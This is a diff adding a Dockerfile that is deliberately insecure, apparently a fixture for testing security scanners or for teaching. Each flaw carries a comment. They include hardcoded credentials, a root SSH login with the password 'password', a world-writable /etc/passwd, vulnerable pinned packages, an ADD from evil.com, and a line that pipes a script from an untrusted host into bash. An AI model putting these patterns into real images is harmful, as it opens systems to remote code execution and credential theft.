@@ -1,0 +1,66 @@
+# Insecure Dockerfile with multiple vulnerabilities
+
+# Using outdated base image with known CVEs
+FROM ubuntu:16.04
+
+# Running as root (no USER directive)
+
+# Hardcoded secrets
+ENV DATABASE_PASSWORD=supersecret123
+ENV API_KEY=sk_live_4eC39HqLyjWDarhtT657tMo5k
+ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+# Installing packages without specifying versions
+RUN apt-get update && apt-get install -y \
+    curl \
+    wget \
+    python \
+    python-pip \
+    git \
+    openssh-server \
+    && rm -rf /var/lib/apt/lists/*
+
+# Using ADD instead of COPY (security issue)
+ADD https://evil.com/malicious.tar.gz /tmp/
+
+# Exposing unnecessary ports
+EXPOSE 22 3306 5432 6379 27017
+
+# Running SSH server (security risk in containers)
+RUN mkdir /var/run/sshd
+RUN echo 'root:password' | chpasswd
+RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+
+# Installing vulnerable Python packages
+RUN pip install --no-cache-dir \
+    django==1.11.0 \
+    flask==0.12.0 \
+    requests==2.6.0 \
+    pyyaml==3.12 \
+    jinja2==2.7.2
+
+# Creating credentials file with secrets
+RUN echo "username=admin\npassword=admin123\napi_key=12345-secret-key" > /root/.credentials
+
+# Copying sensitive files
+COPY id_rsa /root/.ssh/id_rsa
+COPY id_rsa.pub /root/.ssh/id_rsa.pub
+
+# Setting insecure permissions
+RUN chmod 777 /tmp
+RUN chmod 666 /etc/passwd
+
+# Downloading from untrusted source
+RUN curl http://untrusted-site.com/install.sh | bash
+
+# Using latest tag (non-deterministic)
+FROM node:latest as build
+
+# Installing global npm packages with vulnerabilities
+RUN npm install -g express@4.10.0 lodash@4.17.15
+
+# No HEALTHCHECK directive
+
+# Running command as root
+CMD ["/usr/sbin/sshd", "-D"]
